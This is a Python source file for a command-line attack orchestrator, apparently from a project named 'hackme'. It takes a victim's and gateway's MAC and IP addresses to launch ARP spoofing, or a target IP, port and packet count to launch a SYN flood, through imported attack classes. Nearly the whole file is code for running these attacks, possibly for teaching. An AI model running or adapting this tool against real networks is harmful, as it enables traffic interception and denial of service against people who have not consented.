#!/usr/bin/env python3
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 3 as
# published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# Written by:
#        Nadzeya Hutsko <nadzya.info@gmail.com>
"""The orchestrator for all attacks"""


import sys
import argparse
import logging

from hackme import *  # pylint: disable=W0401  # noqa: F403


_LOGGER = logging.getLogger(__name__)


def run_arp_spoofing(arp_spoofer, gw_mac, gw_ip, victim_mac, victim_ip):
    """Run the ARP spoofing attack"""
    arp_spoofer.add_gateway(gw_mac, gw_ip)
    arp_spoofer.add_victim(victim_mac, victim_ip)
    arp_spoofer.run()


def main():  # pylint: disable=R0915
    """The orchestration function"""
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--debug",
        help="Enable the debug mode",
        default=False,
        action="store_true",
    )
    subparser = parser.add_subparsers(
        dest="attack",
        help="Enter the attack name",
    )

    # The ARP spofing subparser
    parser_arp_spoof = subparser.add_parser(
        "arp_spoof", help="The ARP spoofing attack"
    )
    parser_arp_spoof.add_argument(
        "-i",
        "--iface",
        help="Your network interface (i.e. wlp2s0)",
    )
    parser_arp_spoof.add_argument(
        "-m",
        "--mac",
        help="The MAC address of your network interface",
    )
    parser_arp_spoof.add_argument(
        "-gm", "--gwmac", help="The gateway's MAC address"
    )
    parser_arp_spoof.add_argument(
        "-gip", "--gwip", help="The gateway's IPv4 address"
    )
    parser_arp_spoof.add_argument(
        "-vm", "--victmac", help="The victim's MAC address"
    )
    parser_arp_spoof.add_argument(
        "-vip", "--victip", help="The victim's IPv4 address"
    )
    parser_arp_spoof.add_argument(
        "--desc", help="Print attack description", action="store_true"
    )

    # The SYN flood subparser
    parser_syn_flood = subparser.add_parser(
        "syn_flood", help="The SYN flood attack"
    )
    parser_syn_flood.add_argument(
        "-d", "--destIP", help="Destination IP address"
    )
    parser_syn_flood.add_argument(
        "-p", "--port", help="Destination port number"
    )
    parser_syn_flood.add_argument(
        "-c", "--count", "-c", help="Number of packets"
    )
    parser_syn_flood.add_argument(
        "--desc", help="Print attack description", action="store_true"
    )

    args = parser.parse_args()

    format_str = "[ %(funcName)s() ] %(message)s"

    if args.debug:
        logging.basicConfig(format=format_str, level=logging.DEBUG)
    else:
        logging.basicConfig(format=format_str)

    if args.attack is None:
        parser.print_help()

    if args.attack == "arp_spoof":
        try:
            arp_spoofer = ARPSpoofer(args.iface, args.mac)  # noqa: F405
            if args.desc:
                print(arp_spoofer.description)
                sys.exit(0)
            if (
                all(
                    (
                        args.iface,
                        args.mac,
                        args.gwmac,
                        args.gwip,
                        args.victmac,
                        args.victip,
                    )
                )
                is False
            ):
                parser_arp_spoof.print_help()
                sys.exit(0)
            run_arp_spoofing(
                arp_spoofer, args.gwmac, args.gwip, args.victmac, args.victip
            )
        except Exception as exc:
            _LOGGER.error(exc)
            sys.exit(1)

    elif args.attack == "syn_flood":
        try:
            syn_flooder = SYNFlooder(  # noqa: F405
                args.destIP, args.port, args.count
            )
            if args.desc:
                print(syn_flooder.description)
                sys.exit(0)
            if all((args.destIP, args.port, args.count)) is False:
                parser_syn_flood.print_help()
                sys.exit(0)
            syn_flooder.run()
        except Exception as exc:
            _LOGGER.error("\n%s", exc)
            sys.exit(1)


if __name__ == "__main__":
    main()
